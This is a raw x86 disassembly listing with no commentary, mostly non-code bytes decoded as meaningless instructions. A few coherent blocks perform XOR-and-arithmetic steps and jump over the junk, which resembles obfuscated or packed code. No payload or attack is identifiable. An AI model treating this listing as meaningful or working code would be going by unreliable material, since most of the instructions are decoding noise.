  409313:	clc    
  409314:	jno    0x409352
  409316:	push   edx
  409317:	adc    al,0x17
  409319:	push   es
  40931a:	cmp    cl,BYTE PTR [esi]
  40931c:	daa    
  40931d:	jns    0x409328
  40931f:	mov    cl,0x2d
  409321:	je     0x409380
  409323:	cmp    BYTE PTR [eax],0xb
  409326:	and    DWORD PTR [ebp+0x71850c47],edi
  40932c:	in     eax,dx
  40932d:	js     0x40934c
  40932f:	jle    0x4092b1
  409331:	jmp    0x40937a
  409333:	out    0xbb,al
  409335:	push   esp
  409336:	(bad)  
  409337:	(bad)  
  409338:	retf   0xb4b3
  40933b:	mov    bh,0xd1
  40933d:	and    DWORD PTR [esi+0x71],esi
  409340:	dec    ecx
  409341:	out    0x14,eax
  409343:	fwait
  409344:	loopne 0x4092f1
  409346:	push   cs
  409347:	aad    0xcd
  409349:	pop    ds
  40934a:	(bad)  
  40934b:	ins    BYTE PTR es:[edi],dx
  40934c:	out    0x1a,al
  40934e:	gs sub ah,ah
  409351:	sub    BYTE PTR [ebp+0x2],bl
  409354:	dec    esp
  409355:	dec    ecx
  409356:	out    0x12,eax
  409358:	lods   eax,DWORD PTR ds:[esi]
  409359:	adc    dl,al
  40935b:	or     dl,BYTE PTR [eax+0x8649471]
  409361:	retf   0x9e54
  409364:	enter  0x9a36,0x8f
  409368:	test   eax,0xcab429d2
  40936d:	cs inc esp
  40936f:	jb     0x409371
  409371:	and    eax,0x2c5ec01
  409376:	dec    eax
  409377:	mov    ebp,DWORD PTR [esi-0x51]
  40937a:	inc    DWORD PTR [edx]
  40937c:	(bad)  ds:0xae9d1eca
  409382:	push   eax
  409383:	pusha  
  409384:	push   ebx
  409385:	sbb    bl,BYTE PTR [edx]
  409387:	outs   dx,BYTE PTR ds:[esi]
  409388:	shl    al,1
  40938a:	pop    ss
  40938b:	icebp  
  40938c:	sti    
  40938d:	jnp    0x4093ca
  40938f:	test   al,0xf0
  409391:	mov    ds:0x373902a,eax
  409396:	iret   
  409397:	fbld   TBYTE PTR [eax]
  409399:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40939b:	cmp    BYTE PTR [esi-0x7c],0x7b
  40939f:	adc    al,0x92
  4093a1:	das    
  4093a2:	xchg   ebx,eax
  4093a3:	sbb    ecx,DWORD PTR [edi+ebx*8]
  4093a6:	inc    ecx
  4093a7:	pop    ss
  4093a8:	and    BYTE PTR [ebx-0x17],bh
  4093ab:	and    BYTE PTR [edx+0xfcbb0e6],bh
  4093b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093b2:	mov    dl,0x6
  4093b4:	shl    dh,cl
  4093b6:	loope  0x40936a
  4093b8:	repnz imul esp,edi,0xc659c892
  4093bf:	retf   
  4093c0:	stc    
  4093c1:	leave  
  4093c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093c3:	stos   DWORD PTR es:[edi],eax
  4093c4:	sub    ecx,DWORD PTR [esi+0x1e]
  4093c7:	xor    dh,bh
  4093c9:	out    dx,al
  4093ca:	fimul  WORD PTR [edi+0x203b7847]
  4093d0:	ror    esp,cl
  4093d2:	jbe    0x4093b0
  4093d4:	dec    ecx
  4093d5:	sub    al,0x96
  4093d7:	(bad)  
  4093d8:	outs   dx,BYTE PTR ds:[esi]
  4093d9:	jb     0x409404
  4093db:	stos   DWORD PTR es:[edi],eax
  4093dc:	mov    dh,0x57
  4093de:	out    dx,eax
  4093df:	hlt    
  4093e0:	dec    esi
  4093e1:	mov    WORD PTR [ecx-0x7c3d7036],?
  4093e7:	pushf  
  4093e8:	mov    dl,0x12
  4093ea:	or     BYTE PTR [ebx+0x4467c013],al
  4093f0:	cmp    esi,DWORD PTR [ebx]
  4093f2:	sbb    ebx,DWORD PTR [ebx+edi*1+0x60f12439]
  4093f9:	jbe    0x4093c0
  4093fb:	out    dx,eax
  4093fc:	mov    WORD PTR [ebx],?
  4093fe:	std    
  4093ff:	mov    ebp,0xf0997ff6
  409404:	or     ecx,edi
  409406:	ror    BYTE PTR [esp+esi*8+0x186960e3],cl
  40940d:	outs   dx,DWORD PTR ds:[esi]
  40940e:	mov    esp,0x124f9e16
  409413:	jge    0x40947b
  409415:	int    0x63
  409417:	cdq    
  409418:	lds    edi,FWORD PTR [eax]
  40941a:	(bad)  
  40941b:	xchg   ecx,eax
  40941c:	popa   
  40941d:	imul   edx,edi
  409420:	jmp    0x409634
  409425:	clc    
  409426:	icebp  
  409427:	mov    esp,0xb8b16984
  40942c:	icebp  
  40942d:	ficomp DWORD PTR [edx+0x3f5c1fed]
  409433:	scas   al,BYTE PTR es:[edi]
  409434:	ja     0x409434
  409436:	fdiv   DWORD PTR [eax+0x70]
  409439:	imul   edi,DWORD PTR [edi+0x70],0x995cc270
  409440:	bound  esp,QWORD PTR [edx-0x43]
  409443:	add    al,0x1f
  409445:	pop    esi
  409446:	mov    es,edx
  409448:	bound  eax,QWORD PTR [ecx-0x6e511177]
  40944e:	push   eax
  40944f:	mov    eax,0xe7510571
  409454:	sub    edx,DWORD PTR [ebp+0x3c]
  409457:	jle    0x4094d1
  409459:	mov    bh,0xaf
  40945b:	cmp    DWORD PTR [edi+0x66a6d0c9],esp
  409461:	retf   
  409462:	xor    esi,DWORD PTR [esi]
  409464:	je     0x409410
  409466:	dec    edx
  409467:	outs   dx,DWORD PTR ds:[esi]
  409468:	pusha  
  409469:	mov    ds:0x42537a43,al
  40946e:	mov    eax,0x8404d3e4
  409473:	xor    bl,dh
  409475:	inc    ebx
  409476:	cmp    edx,DWORD PTR [esi+ebx*1+0x55b4f012]
  40947d:	loopne 0x4094ec
  40947f:	or     esp,DWORD PTR [ebp+0x254f54c9]
  409485:	aaa    
  409486:	jae    0x409409
  409488:	aas    
  409489:	fsubr  QWORD PTR [ebx+0x14]
  40948c:	loope  0x409484
  40948e:	sub    DWORD PTR [ecx+0x25],eax
  409491:	dec    edi
  409492:	cmovo  edi,esp
  409495:	cmp    BYTE PTR [edx+0x12],al
  409498:	sub    esp,DWORD PTR [esi-0x6c8918fe]
  40949e:	pop    eax
  40949f:	push   ds
  4094a0:	test   eax,0x3c291c19
  4094a5:	xor    dh,cl
  4094a7:	and    ah,BYTE PTR [edi]
  4094a9:	lea    edi,[edx+0x6b]
  4094ac:	daa    
  4094ad:	add    eax,0x3940fb90
  4094b2:	jmp    0xefa9d458
  4094b7:	pop    ecx
  4094b8:	mov    dh,0xcd
  4094ba:	mov    ch,0xaa
  4094bc:	push   ebx
  4094bd:	ins    BYTE PTR es:[edi],dx
  4094be:	dec    esi
  4094bf:	js     0x4094c9
  4094c1:	or     eax,DWORD PTR [eax-0x72]
  4094c4:	mov    esi,0x9739e6b8
  4094c9:	xor    ebp,DWORD PTR [ebx+ebx*4-0x5c38c151]
  4094d0:	inc    ebx
  4094d1:	xchg   ebx,eax
  4094d2:	adc    ebp,ecx
  4094d4:	pop    eax
  4094d5:	adc    al,0x35
  4094d7:	repz or bh,BYTE PTR [ecx+ebp*2-0x77]
  4094dc:	xchg   BYTE PTR [eax+0xb],ch
  4094df:	sbb    eax,esp
  4094e1:	mov    ecx,0x1439672
  4094e6:	jno    0x409526
  4094e8:	jmp    0x7ce5:0x9742a38b
  4094ef:	int3   
  4094f0:	jo     0x40954b
  4094f2:	retf   0x949e
  4094f5:	cld    
  4094f6:	or     dl,ah
  4094f8:	push   esp
  4094f9:	and    DWORD PTR [ebp+eiz*1-0x353e62c9],0x5f3a5a2e
  409504:	mov    bh,0x4f
  409506:	jp     0x4094bc
  409508:	ins    DWORD PTR es:[edi],dx
  409509:	dec    ecx
  40950a:	neg    BYTE PTR [eax+eax*8]
  40950d:	push   ecx
  40950e:	aad    0xbe
  409510:	add    BYTE PTR [ecx-0x4d0ed9db],ch
  409516:	push   ecx
  409517:	rcr    BYTE PTR [ebx+0x2751617c],0xf1
  40951e:	fild   WORD PTR [ebx+eax*1+0x72103d4f]
  409525:	sub    DWORD PTR [ebx],eax
  409527:	pop    ss
  409528:	push   esp
  409529:	(bad)  
  40952a:	xor    BYTE PTR [esi-0x7a866035],bl
  409530:	sub    al,bh
  409532:	mov    dh,0xb1
  409534:	xchg   ecx,eax
  409535:	xchg   BYTE PTR [ebp+0x1],bl
  409538:	test   dh,bh
  40953a:	mov    cl,0x8d
  40953c:	pop    esp
  40953d:	loope  0x4095ba
  40953f:	and    eax,0x9a733402
  409544:	xor    DWORD PTR [edx+eiz*4],edi
  409547:	sti    
  409548:	cmc    
  409549:	jge    0x409515
  40954b:	xchg   dh,al
  40954d:	xchg   ah,dl
  40954f:	xchg   DWORD PTR [ebx],ebp
  409551:	or     bl,ah
  409553:	adc    BYTE PTR [eax-0x40d93927],ah
  409559:	xor    al,0x6e
  40955b:	arpl   di,bx
  40955d:	inc    esp
  40955e:	inc    ecx
  40955f:	sub    WORD PTR [edi],bp
  409562:	fld    st(3)
  409564:	bound  edi,QWORD PTR [ebx+edx*4+0x3a]
  409568:	mov    edi,0xca18edf5
  40956d:	mov    DWORD PTR [esp+esi*2],edx
  409570:	jae    0x409584
  409572:	jne    0x4094f6
  409574:	stos   BYTE PTR es:[edi],al
  409575:	and    DWORD PTR [eax-0x22],ecx
  409578:	and    BYTE PTR [edx+0x1],dl
  40957b:	std    
  40957c:	pop    eax
  40957d:	leave  
  40957e:	jno    0x409553
  409580:	mov    eax,ds:0xcecb0c27
  409585:	fwait
  409586:	cmp    esp,DWORD PTR [edx-0xe]
  409589:	scas   al,BYTE PTR es:[edi]
  40958a:	jecxz  0x40959d
  40958c:	adc    DWORD PTR [ebx+0xc],esi
  40958f:	mov    edi,0x71038f7a
  409594:	and    ah,BYTE PTR [ecx-0x43b59683]
  40959a:	out    0x4f,eax
  40959c:	cmp    BYTE PTR [esi],0xc
  40959f:	mov    ds:0x43fd33b0,eax
  4095a4:	cli    
  4095a5:	int3   
  4095a6:	popa   
  4095a7:	cld    
  4095a8:	stos   BYTE PTR es:[edi],al
  4095a9:	xchg   DWORD PTR [edx],ecx
  4095ab:	jmp    0xda81:0xefbe3227
  4095b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095b4:	out    dx,eax
  4095b5:	bound  esi,QWORD PTR [ecx]
  4095b7:	stc    
  4095b8:	(bad)  
  4095b9:	pop    ss
  4095ba:	and    DWORD PTR [ebx],0xffffff98
  4095bd:	mov    DWORD PTR ds:0x9c3a1c5a,esp
  4095c3:	mov    dl,0xca
  4095c6:	add    ch,bh
  4095c8:	sub    edi,DWORD PTR [edx+0x37523a41]
  4095ce:	popw   ds
  4095d0:	les    ebp,FWORD PTR [edx+0x6d13be4a]
  4095d6:	push   cs
  4095d7:	dec    ecx
  4095d8:	inc    esi
  4095d9:	or     ecx,DWORD PTR [edx+esi*2]
  4095dc:	stos   DWORD PTR es:[edi],eax
  4095dd:	popf   
  4095de:	dec    ebx
  4095df:	pop    ss
  4095e0:	xor    dh,BYTE PTR [ebx]
  4095e2:	xor    DWORD PTR [ecx-0x3eef2373],esp
  4095e8:	(bad)  
  4095e9:	dec    esp
  4095ea:	in     eax,0x45
  4095ec:	aas    
  4095ed:	aaa    
  4095ee:	pop    eax
  4095ef:	out    dx,eax
  4095f0:	sub    ecx,0x2b
  4095f3:	cmp    al,0x94
  4095f5:	and    eax,0x537badf8
  4095fa:	inc    ebx
  4095fb:	jne    0x4095a3
  4095fd:	cli    
  4095fe:	mov    ds:0xf5ec26fa,al
  409603:	inc    edx
  409604:	loope  0x4095c3
  409606:	add    BYTE PTR [esi-0x20df5296],dl
  40960c:	xchg   DWORD PTR [ebp-0x60],edi
  40960f:	mov    esp,0xf0089b93
  409614:	retf   0x93ae
  409617:	inc    edx
  409618:	aaa    
  409619:	xchg   edi,eax
  40961a:	gs sub al,0x9e
  40961d:	add    ebp,DWORD PTR [eax+0x75066367]
  409623:	mov    edi,DWORD PTR [edx]
  409625:	aas    
  409626:	in     al,dx
  409627:	enter  0x4403,0x73
  40962b:	pop    eax
  40962c:	int    0x8
  40962e:	ss jo  0x409655
  409631:	lahf   
  409632:	xor    eax,0xec550310
  409637:	mov    DWORD PTR [ebp-0x14],edx
  40963a:	mov    edx,DWORD PTR [ebp-0xc]
  40963d:	mov    edi,DWORD PTR [ebp-0x24]
  409640:	xor    edx,eax
  409642:	jmp    0x409856
  409647:	dec    ebp
  409648:	iret   
  409649:	lods   eax,DWORD PTR ds:[esi]
  40964a:	dec    ebx
  40964b:	lods   eax,DWORD PTR ds:[esi]
  40964c:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  409653:	rcl    cl,0x7c
  409656:	stos   BYTE PTR es:[edi],al
  409657:	mul    esi
  409659:	jo     0x4096cb
  40965b:	imul   edi,DWORD PTR [edi+0x70],0xc6505770
  409662:	leave  
  409663:	push   edi
  409664:	adc    BYTE PTR [esi+0x403e431d],0x5a
  40966b:	xchg   edi,eax
  40966c:	xlat   BYTE PTR ds:[ebx]
  40966d:	call   0x5dba:0x401047f2
  409674:	hlt    
  409675:	mov    dh,0x94
  409677:	shl    BYTE PTR [esi+0x41],cl
  40967a:	loope  0x409642
  40967c:	mov    bl,0x5c
  40967e:	jmp    0xf2e0bde3
  409683:	(bad)  
  409684:	cmp    edi,DWORD PTR [edx]
  409686:	sub    DWORD PTR [ebx+0x1f],ecx
  409689:	cs mov edi,0x12ff7f4e
  40968f:	sbb    bl,BYTE PTR [ebp+0xf]
  409692:	pop    edx
  409693:	imul   esi,DWORD PTR [ecx-0x618571bc],0x94ba5999
  40969d:	or     al,0x8d
  40969f:	sub    ebp,esp
  4096a1:	nop
  4096a2:	(bad)  
  4096a3:	mov    esi,0xbb787abd
  4096a8:	sar    BYTE PTR [ebx-0x4d1c59a1],cl
  4096ae:	ror    BYTE PTR [ecx+ebx*4-0x54],cl
  4096b2:	jne    0x40970c
  4096b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096b5:	int3   
  4096b6:	xor    al,0x98
  4096b8:	push   0x73d012f6
  4096bd:	sbb    DWORD PTR [eax+0x644998be],ebx
  4096c3:	jmp    0xd40a:0x4df9ee10
  4096ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096cb:	lahf   
  4096cc:	mov    cl,0xf2
  4096ce:	mov    cl,0x2d
  4096d0:	jg     0x4096cf
  4096d2:	js     0x409704
  4096d4:	cwde   
  4096d5:	jne    0x4096fc
  4096d7:	push   es
  4096d8:	and    eax,0x3bd8cd8c
  4096dd:	leave  
  4096de:	imul   edx,DWORD PTR [edi],0x1e1394d2
  4096e4:	ror    ch,0xc5
  4096e7:	(bad)
  4096eb:	sbb    BYTE PTR [ebp-0x34b49f42],0x52
  4096f2:	shr    BYTE PTR [ebp+0x142b45ec],cl
  4096f8:	xchg   edx,eax
  4096f9:	fmul   QWORD PTR [ebp-0x5fc06211]
  4096ff:	and    al,0x8b
  409701:	adc    cl,al
  409703:	push   eax
  409704:	into   
  409705:	ror    DWORD PTR [eax+0x7f],cl
  409708:	pop    esi
  409709:	pop    esp
  40970a:	pop    ss
  40970b:	push   edx
  40970c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40970d:	ins    DWORD PTR es:[edi],dx
  40970e:	das    
  40970f:	sub    al,0x69
  409711:	sbb    BYTE PTR [ecx+eiz*1-0x5c],cl
  409715:	fmul   DWORD PTR [edi-0x67]
  409718:	add    bl,BYTE PTR [edi+eax*8+0x1cbd33e0]
  40971f:	push   cs
  409720:	cmp    al,ch
  409722:	dec    ebx
  409723:	pop    ebp
  409724:	loopne 0x4096fc
  409726:	dec    ebx
  409727:	mov    bh,0xbe
  409729:	out    dx,eax
  40972a:	mov    bl,0x17
  40972c:	das    
  40972d:	lods   eax,DWORD PTR ds:[esi]
  40972e:	pop    ebp
  40972f:	mov    al,al
  409731:	(bad)  
  409732:	std    
  409733:	sub    DWORD PTR [ebp+0x4e],0xffffff96
  409737:	inc    eax
  409738:	aas    
  409739:	sbb    edx,DWORD PTR [ebx-0x148954b]
  40973f:	xchg   esp,esp
  409741:	jmp    0x409704
  409743:	fstp   TBYTE PTR [ebx-0x5965bbe0]
  409749:	(bad)  
  40974a:	in     eax,dx
  40974b:	mov    DWORD PTR [esi-0x3d],ebp
  40974e:	fst    DWORD PTR [edi+edx*4]
  409751:	adc    eax,0x3729f5cf
  409756:	xlat   BYTE PTR ds:[ebx]
  409757:	adc    BYTE PTR ds:0xc9047b2b,bl
  40975d:	adc    ebp,ebp
  40975f:	lahf   
  409760:	dec    eax
  409761:	add    bh,BYTE PTR [esi]
  409763:	nop
  409764:	scas   al,BYTE PTR es:[edi]
  409765:	jo     0x409715
  409767:	sbb    eax,0x97c25854
  40976c:	mov    bl,0xea
  40976e:	sbb    esp,DWORD PTR [eax+esi*4]
  409771:	add    DWORD PTR [esi+0x11],edi
  409774:	sub    eax,0xdb01e0ff
  409779:	lds    esi,FWORD PTR [ebx]
  40977b:	stos   DWORD PTR es:[edi],eax
  40977c:	jp     0x409752
  40977e:	xor    eax,0x937fb957
  409783:	mov    eax,ds:0x4beafa80
  409788:	icebp  
  409789:	add    DWORD PTR [eax+ebp*1+0x6ac217c4],esp
  409790:	jl     0x4097d5
  409792:	test   eax,0x4e099881
  409797:	mov    esi,0xd38f8dcf
  40979c:	jae    0x4097c1
  40979e:	xchg   ebp,eax
  40979f:	mov    cl,0x63
  4097a1:	clc    
  4097a2:	cs pop ds
  4097a4:	xchg   esi,eax
  4097a5:	push   edi
  4097a6:	or     ch,bh
  4097a8:	sub    DWORD PTR [ecx+0x79a00ea3],ecx
  4097ae:	mov    ecx,0xc21edff3
  4097b3:	mov    edx,0x31f610d
  4097b8:	xor    DWORD PTR [edi-0x48d3267e],ebx
  4097be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097bf:	add    al,0xe0
  4097c1:	lock int3 
  4097c3:	push   ecx
  4097c4:	(bad)  
  4097c5:	imul   edx,DWORD PTR [ebx],0x21
  4097c8:	neg    BYTE PTR [eax]
  4097ca:	pushf  
  4097cb:	push   0x15763013
  4097d0:	pop    edx
  4097d1:	adc    eax,0xf70f7de6
  4097d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097d7:	daa    
  4097d8:	push   0x84022a
  4097dd:	clc    
  4097de:	sar    BYTE PTR [ebp-0x4],cl
  4097e1:	pop    ebx
  4097e2:	test   eax,0xee1f2cde
  4097e7:	rcr    ebx,cl
  4097e9:	add    eax,0xaf403942
  4097ee:	sbb    BYTE PTR [ebx+0xc],bl
  4097f1:	cmp    BYTE PTR [edi],cl
  4097f3:	outs   dx,DWORD PTR ds:[esi]
  4097f4:	jmp    0x4097b9
  4097f6:	sbb    ah,dl
  4097f8:	xor    al,0x6e
  4097fa:	jecxz  0x4097e6
  4097fc:	mov    ebx,0xdcb18ded
  409801:	jmp    0x2c76:0x1875f62e
  409808:	pop    edi
  409809:	popa   
  40980a:	sahf   
  40980b:	dec    edx
  40980c:	(bad)  
  40980e:	scas   al,BYTE PTR es:[edi]
  40980f:	mov    eax,ds:0xc373d739
  409814:	out    dx,al
  409815:	push   eax
  409816:	fsub   QWORD PTR gs:[edx+0x24]
  40981a:	es inc edi
  40981c:	test   al,0xb
  40981e:	push   ds
  40981f:	dec    esi
  409820:	xchg   esi,eax
  409821:	add    eax,0x2ad3b42a
  409826:	ins    DWORD PTR es:[edi],dx
  409827:	push   esp
  409828:	bound  eax,QWORD PTR [ebx-0x4a]
  40982b:	stc    
  40982c:	fild   WORD PTR [ebp-0x5331b5db]
  409832:	sub    al,0xd1
  409834:	sub    bh,BYTE PTR [edi+0xa]
  409837:	fiadd  WORD PTR [edi]
  409839:	call   0x5e5bfa62
  40983e:	push   esi
  40983f:	neg    BYTE PTR [ecx]
  409841:	fcom   DWORD PTR [edx]
  409843:	aam    0x4b
  409845:	ret    0xbde3
  409848:	adc    dl,BYTE PTR ds:0x549188ad
  40984e:	(bad)
  409852:	out    dx,eax
  409853:	inc    ecx
  409854:	bound  ebp,QWORD PTR [edx-0x50f02efd]
  40985a:	xlat   BYTE PTR ds:[ebx]
  40985b:	mov    edi,DWORD PTR [ebp-0xc]
  40985e:	xor    edi,eax
  409860:	sub    edx,edi
  409862:	mov    edi,DWORD PTR [ebp-0xc]
  409865:	mov    ebx,DWORD PTR [ebp-0x14]
  409868:	xor    edi,eax
  40986a:	add    edi,ecx
  40986c:	imul   edi,ebx
  40986f:	mov    ebx,DWORD PTR [ebp-0x18]
  409872:	xor    ebx,eax
  409874:	sub    edx,ecx
  409876:	lea    edi,[edi+ebx*1+0x32729c]
  40987d:	cmp    edi,edx
  40987f:	jbe    0x408b6b
  409885:	mov    edx,DWORD PTR [ebp-0xc]
  409888:	jmp    0x409a9c
  40988d:	int3   
  40988e:	sub    eax,0xbde9be20
  409893:	push   0xffffffa9
  409895:	mov    ebp,0x407bf628
  40989a:	loopne 0x409866
  40989c:	test   al,0xe0
  40989e:	in     al,0x70
  4098a0:	jo     0x40990b
  4098a2:	jg     0x409914
  4098a4:	jo     0x4098f0
  4098a6:	scas   eax,DWORD PTR es:[edi]
  4098a7:	mov    ecx,0xf6a09d14
  4098ac:	lods   eax,DWORD PTR ds:[esi]
  4098ad:	sbb    ecx,eax
  4098af:	fld    QWORD PTR [eax+ebp*4+0x49a78918]
  4098b6:	dec    edx
  4098b7:	dec    eax
  4098b8:	sar    BYTE PTR [edi+0x52],1
  4098bb:	mov    cs,WORD PTR [eax]
  4098bd:	xor    DWORD PTR [ebx+0x1ca1f95c],ebx
  4098c3:	shl    DWORD PTR [esp+ecx*4+0x182c8a1d],1
  4098ca:	ja     0x40991c
  4098cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098cd:	mov    dh,0x97
  4098cf:	(bad)  
  4098d1:	scas   al,BYTE PTR es:[edi]
  4098d2:	stc    
  4098d3:	loop   0x4098c4
  4098d5:	loop   0x409935
  4098d7:	sbb    al,0xa2
  4098d9:	mov    bh,0xae
  4098db:	stc    
  4098dc:	xchg   BYTE PTR ds:0x8d9edebf,al
  4098e2:	shl    cl,cl
  4098e4:	and    dl,dl
  4098e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098e7:	dec    ecx
  4098e8:	hlt    
  4098e9:	sbb    BYTE PTR [esi],0x79
  4098ec:	pusha  
  4098ed:	jle    0x40991c
  4098ef:	xchg   ebp,eax
  4098f0:	lea    esi,[eax-0x41ddf8e8]
  4098f6:	cmp    al,0x91
  4098f8:	xchg   edi,eax
  4098f9:	sbb    DWORD PTR [ecx],esi
  4098fb:	call   0x6e7a:0xeaddda36
  409902:	pop    edx
  409903:	jnp    0x409961
  409905:	stos   BYTE PTR es:[edi],al
  409906:	ret    0x92b5
  409909:	inc    ebx
  40990a:	cmp    BYTE PTR [ebx+0x71],ah
  40990d:	inc    ebx
  40990e:	xchg   ebp,eax
  40990f:	cmc    
  409910:	sub    eax,DWORD PTR [esi]
  409912:	leave  
  409913:	shl    DWORD PTR ds:0x61236a81,cl
  409919:	in     al,0x2c
  40991b:	push   ss
  40991c:	mov    ah,0x3f
  40991e:	test   BYTE PTR [ecx],dh
  409920:	sub    bh,cl
  409922:	jl     0x4098dc
  409924:	mov    bl,0xa9
  409926:	or     edi,DWORD PTR [eax]
  409928:	adc    edx,edi
  40992a:	lds    edx,FWORD PTR [eax+0x43]
  40992d:	inc    ecx
  40992e:	xchg   ebp,eax
  40992f:	repz leave 
  409931:	jnp    0x4098dd
  409933:	nop
  409934:	js     0x4098dd
  409936:	(bad)  
  409937:	adc    eax,0xe8718a48
  40993c:	nop
  40993d:	jb     0x4098ca
  40993f:	add    bh,BYTE PTR [esi]
  409941:	call   0xf32ac8e
  409946:	call   0xd66c:0xd9d093e
  40994d:	pop    eax
  40994e:	rol    BYTE PTR [edi-0x4a19b348],0xb0
  409955:	shl    BYTE PTR [ecx-0x70b44296],cl
  40995b:	jns    0x409908
  40995d:	cs sti 
  40995f:	(bad)  [ebp-0x3a98aa71]
  409965:	div    cl
  409967:	cmp    BYTE PTR [ecx],ch
  409969:	push   ss
  40996a:	ins    BYTE PTR es:[edi],dx
  40996b:	sub    BYTE PTR [edi+0x2cadb1a1],ch
  409971:	xor    ch,ch
  409973:	shl    BYTE PTR [esi],1
  409975:	push   ecx
  409976:	mov    dh,0x48
  409978:	adc    ah,bh
  40997a:	xchg   ebx,eax
  40997b:	push   edx
  40997c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40997d:	mov    WORD PTR [edi-0x50],cs
  409980:	push   0x38a83122
  409985:	ret    
  409986:	jno    0x4099e5
  409988:	imul   edi,ebx,0x7e
  40998b:	test   DWORD PTR [eax+0x5896103b],0x77e569f2
  409995:	pop    ecx
  409996:	xor    dh,BYTE PTR [ebp+0x1e]
  409999:	hlt    
  40999a:	shl    DWORD PTR [edx],cl
  40999c:	fld    TBYTE PTR cs:[eax-0x2c]
  4099a0:	mov    BYTE PTR [ecx],ah
  4099a2:	and    edx,DWORD PTR [ebx]
  4099a4:	and    eax,esp
  4099a6:	repz fcom QWORD PTR [esi]
  4099a9:	das    
  4099aa:	sub    ah,BYTE PTR [esi]
  4099ac:	ror    BYTE PTR [esi-0x16],1
  4099af:	sbb    BYTE PTR [edx+0x5f],0xcd
  4099b3:	es xor al,0x41
  4099b6:	cmp    bl,BYTE PTR [ebp-0xb]
  4099b9:	hlt    
  4099ba:	mov    cl,0xaa
  4099bc:	loop   0x409a23
  4099be:	pop    edi
  4099bf:	inc    eax
  4099c0:	fiadd  DWORD PTR [ebp-0x5a]
  4099c3:	mov    bl,0xdf
  4099c5:	test   DWORD PTR [ebx-0x45cabf45],esp
  4099cb:	inc    edi
  4099cc:	mov    esp,0x529b7aa7
  4099d1:	sbb    ecx,DWORD PTR [ecx]
  4099d3:	jne    0x4099d2
  4099d5:	sbb    bl,BYTE PTR [ebp+0x6fa69e31]
  4099db:	js     0x409974
  4099dd:	mov    fs,edx
  4099df:	in     eax,0x55
  4099e1:	or     DWORD PTR ds:0x92208a39,0x29672484
  4099eb:	in     al,0xd
  4099ed:	(bad)  
  4099ee:	xor    al,0x4f
  4099f0:	sbb    ah,ah
  4099f2:	fldcw  WORD PTR [eax+0x3a]
  4099f5:	push   esi
  4099f6:	loopne 0x4099a2
  4099f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099f9:	xor    BYTE PTR [edi+0x14],0xab
  4099fd:	out    0xaa,eax
  4099ff:	retf   
  409a00:	add    dh,BYTE PTR [ebx+0x1aef06a9]
  409a06:	loopne 0x409a16
  409a08:	les    ebx,FWORD PTR [ecx]
  409a0a:	xchg   ebp,eax
  409a0b:	lea    edi,[ecx+0x7008d6e]
  409a11:	mov    ch,0x24
  409a13:	out    dx,eax
  409a14:	jp     0x409a74
  409a16:	aaa    
  409a17:	cmp    DWORD PTR [eax+0x425ecc35],0xffffffa6
  409a1e:	or     BYTE PTR [ebp+0x2d58d26a],dh
  409a24:	push   ecx
  409a25:	mov    ecx,0x4b0a283e
  409a2a:	outs   dx,DWORD PTR ds:[esi]
  409a2b:	mov    WORD PTR [ecx+0x53],es
  409a2e:	in     eax,0xf1
  409a30:	pop    edx
  409a31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a32:	add    al,0x91
  409a34:	pop    esp
  409a35:	outs   dx,DWORD PTR ds:[esi]
  409a36:	xchg   esi,eax
  409a37:	sbb    al,0xc3
  409a39:	test   eax,0xab5a5727
  409a3e:	push   ss
  409a3f:	(bad)  
  409a41:	push   ss
  409a42:	push   es
  409a43:	sbb    al,0x57
  409a45:	je     0x409a58
  409a47:	or     al,dh
  409a49:	push   0x48
  409a4b:	mov    cl,0xd9
  409a4d:	push   cs
  409a4e:	sub    ch,BYTE PTR [ebp+0x5]
  409a51:	sub    edx,esp
  409a53:	(bad)  
  409a54:	in     al,dx
  409a55:	outs   dx,BYTE PTR ds:[esi]
  409a56:	(bad)  
  409a58:	inc    esi
  409a59:	aas    
  409a5a:	push   ebx
  409a5b:	inc    ebx
  409a5c:	dec    edi
  409a5d:	inc    edi
  409a5e:	stos   DWORD PTR es:[edi],eax
  409a5f:	push   ebp
  409a60:	xchg   BYTE PTR [ebx+edx*2],dh
  409a63:	lods   eax,DWORD PTR ds:[esi]
  409a64:	test   DWORD PTR [edx-0x7c],esi
  409a67:	dec    esp
  409a68:	sbb    eax,0x7ead599c
  409a6d:	mov    WORD PTR [ebp+0x59df3c36],ss
  409a73:	mov    cl,0xfb
  409a75:	xchg   ebx,eax
  409a76:	out    dx,al
  409a77:	dec    esi
  409a78:	sbb    BYTE PTR [edx],ah
  409a7a:	loopne 0x409acb
  409a7c:	fcomp  DWORD PTR [eax]
  409a7e:	sub    DWORD PTR [esi+ebp*2-0x6],0x4e89f875
  409a86:	ret    
  409a87:	mov    bl,bl
  409a89:	or     al,cl
  409a8b:	add    ah,BYTE PTR [eax+0x7b95bc4e]
  409a91:	or     edi,ebp
  409a93:	inc    ebx
  409a94:	out    dx,al
  409a95:	int    0x2b
  409a97:	sub    dh,0x37
  409a9a:	addr16 dec ecx
  409a9c:	mov    edi,DWORD PTR [ebp-0x24]
  409a9f:	xor    edx,eax
  409aa1:	add    edx,ecx
  409aa3:	imul   edx,edi
  409aa6:	mov    edi,DWORD PTR [ebp-0x18]
  409aa9:	xor    edi,eax
  409aab:	add    edx,edi
  409aad:	mov    edi,DWORD PTR [ebp-0x8]
  409ab0:	lea    edx,[edx+edi*1+0x32729c]
  409ab7:	mov    DWORD PTR [ebp-0x8],edx
  409aba:	mov    edx,DWORD PTR [ebp-0x20]
  409abd:	jmp    0x409cd1
